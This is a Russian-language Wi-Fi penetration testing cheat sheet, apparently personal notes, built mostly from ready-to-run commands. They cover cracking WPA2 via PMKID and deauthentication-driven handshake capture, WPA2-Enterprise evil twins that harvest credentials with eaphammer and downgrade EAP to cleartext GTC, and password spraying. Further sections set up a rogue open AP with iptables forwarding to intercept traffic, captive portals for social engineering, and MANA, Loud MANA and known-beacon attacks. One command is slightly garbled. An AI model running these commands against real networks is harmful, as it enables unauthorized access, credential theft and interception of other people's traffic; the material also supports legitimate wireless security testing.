## Оборудование для анализа защищенности беспроводных сетей.
Полный список протестированных на kali сетевых адаптеров пригодных для проведения анализа защищенности беспроводных сетей:
https://hackware.ru/?p=6780
Если лень читать
Wi-Fi адаптер Alfa Network AWUS036ACH умеет все, стоит меньше 100$.
https://www.youtube.com/watch?v=hEXwOkyYNL0
Лучшее видео по установке драйверов для данного оборудования.

## Инструменты:
https://www.aircrack-ng.org/install.html
https://github.com/s0lst1c3/eaphammer

## Подготовка к работам, проверка работоспособности оборудования
```
ip link show # Выдаст список доступных интерфейсов
iwconfig # Покажет доступные беспроводные интерфейсы
airmon-ng check kill # Убить конфликтующие процессы
airmon-ng start wlan0 # Режим мониторинга
airmon-ng stop wlan0mon # Обычный режим
iwconfig wlan0 mode monitor # Режим мониторинга через iwconfig
iwconfig wlan0mon mode managed # Обычный режим через iwconfig
```

## Основные команды для сбора информации о беспроводных сетях
```
airodump-ng wlan0mon 
// Сканит 2.4Ghz
airodump-ng wlan0mon --band a 
// Сканит 5Ghz
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" 
// Покажет доступные беспроводные точки доступа
airodump-ng --band a mon0 
// Мониторинг 5Ghz точек доступа
```
Поиск скрытых SSID
```
mdk3 wlan0 p -t 20:02:AF:32:D2:61 -f /root/essid.txt # перебор по словарю

mdk3 wlan0 p -t 20:02:AF:32:D2:61 -с 6 -b l # пример обычного перебора
```
` -b l` означает набор символов, при этом `l` означает нижний регистр.

Наборы символов:
```
все печатные (a)
нижний регистр (l)
верхний регистр (u)
цифры (n)
нижний и верхний регистр (c)
нижний и верхний регистр плюс цифры (m)
```

## Атаки на WPA2-Personal
**PMKID**
Тип атаки, которая не только опирается на один единственный пакет, но и не требует подключения клиентов к нашей целевой точке доступа или, если клиенты подключены, не требует отправки им пакетов деаутентификации, нет никакого взаимодействия между атакующим и клиентскими станциями, а только между атакующим и точкой доступа!
Многие современные маршрутизаторы добавляют необязательное поле в конце первого пакета EAPOL, отправленного самой точкой доступа, когда кто-то подключается, так называемую Robust Security Network, которая включает в себя PMKID.
```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Поскольку строка «PMK Name» является константой, мы знаем, что и BSSID точки доступа, и станции, а PMK - это тот же самый идентификатор, полученный в результате полного 4-стороннего рукопожатия, это все, что нужно hashcat для взлома PSK и восстановления пароля.
Команды для проведения атаки:

```
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Захваченные PMKID будут показаны в консоли, а также сохранены в файле /tmp/attack.pcap.
Теперь необходимо конвертировать дамп трафика в удобный формат для hashcat и взломать его:
```
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
**Перехват рукопожатий**
Перехват рукопожатия
Одним из способов атаки на сети WPA/WPA2 является перехват рукопожатия и попытка взломать используемый пароль в автономном режиме. Для этого вам необходимо найти BSSID и канал сети жертвы, а также клиента, подключенного к этой сети.
Получив эту информацию, вы должны начать прослушивать все коммутации этого BSSID в этом канале, потому что есть надежда, что рукопожатие будет отправлено туда:

Перед атакой на клиента, необходимо начать сбор трафика с целевой точки.
В одном терминале или экране tmux:
```
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap # airodump-ng при успешном перехвате выведет на экран сообщение типа WPA handshake:64:20:9F:15:4F:D7
```
Теперь проведем атаку на клиента.
В другом окне терминала пишем команду:
```
aireplay-ng -0 1 -a 64:20:9F:15:4F:D7 wlan0
```

Проверим есть ли валидные рукопожатия в файле с дампом:
```
aircrack-ng psk-01.cap
```
Ломаем рукопожатия при помощи aircrack-ng
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```

**Атаки на WPA2-Enterprise**

Общая концепция ролей в процессе получения авторизации:

***Клиент (Supplicant)*** 
*Беспроводная точка до*ступа \- проводит аутентификацию клиента  
*Сервер аутентификации* \- например RADIUS

***EAP (Extensible Authentication Protocol)*** \- это основа аутентификационной коммуникации в беспроводных сетях WPA2 Enterprise, поверх которого используется алгоритм аутентификации, используемый сервером для аутентификации клиента (супликанта) и в тех же случаях клиентом для аутентификации сервера.

Алгоритмы аутентификации, используемые в данном случае:

**EAP-GTC**: является методом EAP для поддержки использования аппаратных токенов и одноразовых паролей с помощью EAP-PEAP. Его реализация похожа на MSCHAPv2, но не использует одноранговый вызов. Вместо этого пароли отправляются на точку доступа в открытом виде.

**EAP-MD-5** (Message Digest): Клиент отправляет MD5-хэш пароля. Не рекомендуется: Уязвимость к атакам по словарю, отсутствие аутентификации сервера и способа генерировать на сессию ключи проводной эквивалентной конфиденциальности (WEP).

**EAP-TLS** (безопасность транспортного уровня): Он полагается на сертификаты на стороне клиента и сервера для выполнения аутентификации и может использоваться для динамической генерации пользовательских и сеансовых WEP-ключей для защиты последующих коммуникаций.

**EAP-TTLS** (Tunneled Transport Layer Security): Взаимная аутентификация клиента и сети через зашифрованный канал (или туннель), а также средство для получения динамических, пользовательских и сессионных WEP-ключей. В отличие от EAP-TLS, **EAP-TTLS** требует только сертификаты на стороне сервера (клиент будет использовать учетные данные).

**PEAP (Protected Extensible Authentication Protocol)**: PEAP похож на протокол EAP, но создает туннель TLS для защиты связи. Тогда слабые протоколы аутентификации могут использоваться поверх EAP, так как они будут защищены туннелем.

**PEAP-MSCHAPv2**: Этот протокол также известен как просто PEAP, поскольку он широко распространен. Это просто уязвимый запрос ответ с вызовом MSCHAPv2 поверх PEAP (он защищен туннелем TLS).

**PEAP-EAP-TLS** или просто PEAP-TLS: очень похож на EAP-TLS, но перед обменом сертификатами создается TLS-туннель.

#### Основные типы атак:

Перехват имени пользователей доменных учетных записей и Password Spray  
При использовании EAP необходимо помнить, что используются пакеты "Identity" поддерживаются, а имя пользователя будет передается в открытом виде в пакетах типа "Response Identity".

Даже используя один из самых безопасных методов аутентификации: PEAP-EAP-TLS, можно перехватить имя пользователя, отправленное в протоколе EAP.  
Для перехвата достаточно запустить airodump-ng внутри канала и wireshark на том же интерфейсе.  
Отфильтровав ответы по ключевому слову "eapol" внутри пакета "Response, Identity" появится имя пользователя клиента, которое можно использовать для дальнейшей атаки.  
EAP-PEAP и EAP-TTLS поддерживают анонимную передачу идентификационных данных, но не всегда это используется.

Пример команды для проведения атаки:

```
**./eaphammer --eap-spray \
    --interface-pool wlan0 wlan1 \
    --essid название_ТД \
    --password значение_пароля \
    --user-списокпользователей.txt**
```


Что можно выжать из атак на клиентов беспроводных сетей:  
Учетные данные и чувствительную информацию, возможность обхода процесса аутентификации, атаки типа отказ в использовании.



## Примеры атак

Здесь в основном будут разобраны примеры с использованием eaphammer, более задокументированного и актуального ПО для анализа защищенности Enterprise WPA2 не нашлось.
Флаги для работы с диапазоном 5Ghz у eaphammer взято из Wiki проекта
**The primary modes you'll most likely need to concern yourself with are:**

802.11b - Older specification, 2.4GHz only
802.11a - Used for creating 5GHz access points
802.11g - Used for creating 2.4GHz access points
802.11n - Can be used on both the 2.4GHz and 5GHz spectrums.

```
# --hw-mode flag omitted, 2.4GHz channel selected. EAPHammer will automatically set hw_mode to g
./eaphammer -i wlan0 \
	-e safewifis \
	--creds \
	--channel 2

# --hw-mode flag omitted, 5GHz channel selected. EAPHammer will automatically set hw_mode to a
./eaphammer -i wlan0 \
	-e safewifis \
	--creds \
	--channel 36
```


**Простая открытая сеть для сбора трафика с доступом в интернет**  

``apt-get  install dnsmasq
vi/etc/dnsmasq.conf``

Пишем это в конфиг
```
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```

*Вводим комманды*
```
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0;
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1;
dnsmasq -C dnsmasq.conf -d
```
*Затем пишем конфиг к hostapd*
`vi hostapd.conf`
```
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```

*Сохраняем и запускаем*

```
airmon-ng check kill;
iwconfig wlan0 mode monitor;
ifconfig wlan0 up;
hostapd ./hostapd.conf
```


*Перенаправление*
```
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE;
iptables --append FORWARD --in-interface wlan0 -j ACCEPT;
echo 1 > /proc/sys/net/ipv4/ip_forward
```

```
eaphammer -i wlan0 --channel <channel_number> --auth open --essid <SSID>
```

Пример команды для создания captive portal ддя атак методами соцальной инженерии:
```
./eaphammer -i wlan0 --essid Гостелеком --captive-portal
``` 
адаптер в обычном режиме.

Более интересная техника с использованием MITM атаки и программы Interceter-NG позволяющая методами социальной инженерии получить учетные данные пользователей или даже вынудить пользователя запустить вредоноcное ПО на клиентском устройстве. Потребуется устройство на Windows с отключенным Defender'ом для работы с софтом.
[https://www.youtube.com/watch?v=l2Xbm9TInKc](CAPTIVE PORTAL на Intercepter-NG.)


## Теория атак на клиентские устройства
**Выбор сети и роуминг**  
Хотя протокол 802.11 имеет очень конкретные правила, которые диктуют, как станция может присоединиться к ESS, он не определяет, как станция должна выбирать ESS для подключения. Кроме того, протокол позволяет станциям свободно перемещаться между точками доступа, имеющими один и тот же идентификатор ESSID (потому что ты не захочешь потерять WiFi-соединение, переходя из одного конца здания в другой и т.д.). Однако протокол 802.11 не определяет, как должны выбираться эти точки доступа. Более того, несмотря на то, что станции должны быть аутентифицированы на ESS, чтобы связаться с точкой доступа, протокол 802.11 не требует, чтобы точка доступа была аутентифицирована на станции.

**Списки предпочитаемых сетей (PNL)**  
Каждый раз, когда станция подключается к беспроводной сети, ESSID сети сохраняется в списке предпочтительных сетей (PNL) станции. PNL - это упорядоченный список всех сетей, к которым станция подключалась в прошлом, и каждая запись в PNL содержит ESSID сети и любую специфическую для сети конфигурационную информацию, необходимую для установления соединения.

**Пассивное сканирование**  
В инфраструктурных сетях точки доступа периодически передают сигнальные пакеты, чтобы сообщить о своем присутствии и возможностях близлежащим станциям. Маячки \- это широковещательные пакеты они предназначены для приема всеми ближайшими станциями в радиусе действия. Маячки содержат информацию о поддерживаемых точкой доступа скоростях, возможностях шифрования, дополнительную информацию, и, что самое важное, маячки содержат ESSID точки доступа (если трансляция ESSID не отключена).  
Во время пассивного сканирования клиентское устройство прослушивает сигнальные кадры от близлежащих точек доступа. Если клиентское устройство получает кадр маяка, поле ESSID которого совпадает с ESSID из PNL клиента, клиент автоматически подключается к точке доступа, которая отправила кадр маяка. Затем, предположим, мы хотим нацелиться на беспроводное устройство, которое в настоящее время не подключено ни к одной беспроводной сети. Если мы знаем хотя бы одну запись в PNL этого клиента, мы можем заставить его подключиться к нам, просто создав собственную точку доступа с ESSID этой записи.

**Активное зондирование**  
Второй алгоритм выбора сети, используемый в 802.11, известен как активное зондирование. Клиентские устройства, использующие активное зондирование, постоянно передают кадры запроса зонда, чтобы определить, какие точки доступа находятся в радиусе действия, а также каковы их возможности. Запросы зондирования бывают двух видов: направленные и широковещательные. Направленные запросы адресованы определенному идентификатору ESSID и являются способом клиента проверить, есть ли поблизости определенная сеть.  
Клиенты, использующие направленное зондирование, будут посылать запросы зондирования для каждой сети в своей PNL. Следует отметить, что направленное зондирование - это единственный способ определить наличие близлежащих скрытых сетей. Запросы широковещательного зондирования работают почти так же, но в поле SSID устанавливается значение NULL. Это адресует широковещательный запрос всем близлежащим точкам доступа, позволяя станции проверить, есть ли поблизости какие-либо предпочитаемые сети, не раскрывая содержимого своей PNL.

**Evil Twin** - тип атаки на клиентов Wi-Fi, эксплуатирующий недостатки в реализации в клиентской части EAP и возможностям протокола 802.11, позволяющий клиентам без ограничений перемещаться между точками доступа с единым ESSID.

**WPA2 Enterprise Evil Twin**

```
# Генерим сертификат
./eaphammer --cert-wizard

# Запуск атаки
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid Гостелеком --creds
```

По умолчанию EAPHammer использует эти методы аутентификации (обратите внимание на GTC как на первую попытку получить пароли в открытом виде, а затем на использование более надежных методов аутентификации
):
```
GTC
MSCHAPV2
TTLS-MSCHAPV2
TTLS
TTLS-CHAP
TTLS-PAP
TTLS-MSCHAP
MD5
```

Это методика по умолчанию, чтобы избежать длительного времени соединения. Однако вы также можете указать серверу методы аутентификации от самого слабого к самому сильному:
`--negotiate weakest`
Или можно использовать:
`--negotiate gtc-downgrade` использовать высокоэффективную реализацию понижения GTC (обычные пароли)
`--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` указать вручную предлагаемые методы (предлагая те же методы аутентификации в том же порядке, что и организация, атаку будет гораздо сложнее обнаружить).

```
https://solstice.sh/2019/09/10/eap-downgrade-attacks/
```



## MANA
При атаках MANA направленные ответы зонда используются для восстановления PNL близлежащих станций. Когда от станции поступает широковещательный запрос маяка, точка доступа атакующего отвечает произвольным SSID из PNL станции, который уже был замечен в прямом зондировании от этого устройства.
В общем, алгоритм MANA работает следующим образом: каждый раз, когда точка доступа получает запрос маяка, она сначала определяет, является ли он широковещательным или направленным. Если это направленный зонд, MAC-адрес отправителя добавляется в хэш-таблицу (если его там еще нет), а ESSID добавляется в PNL этого устройства. Затем точка доступа отвечает направленным запросом. Если это широковещательный маячек, точка доступа отвечает маячками для каждой сети в PNL этого устройства.
Атака MANA с использованием eaphammer:
```
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```

## Loud MANA
Атака основывается на идее, что клиентские устройства, находящиеся в непосредственной физической близости друг от друга, скорее всего, имеют хотя бы несколько общих записей в своих PNL.
В резюме, атака Loud MANA вместо того, чтобы отвечать на запросы зонда с каждым ESSID в PNL конкретного устройства, неавторизованная точка доступа посылает ответы маячка для каждого ESSID в каждой PNL всех устройств, которые она видела раньше.
```
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```

## Атака по известным маякам
Можно использовать скрипт внутри проекта Eaphammer для быстрого запуска маяков с каждым именем ESSID внутри файла. Если объединить этот скрипт с MANA-атакой Eaphammer, клиенты смогут подключиться к нашей точке доступа. forge-beacons - модуль eaphammer
```
./forge-beacons -i wlan1 \
 --bssid de:ad:be:ef:13:37 \
 --known-essids-file known-s.txt \
 --dst-addr 11:22:33:11:22:33 \
 --burst-count 5
 ```

## Почитать:
https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee
https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9
https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38
https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d
https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf
https://solstice.sh/2019/09/10/eap-downgrade-attacks/
https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/

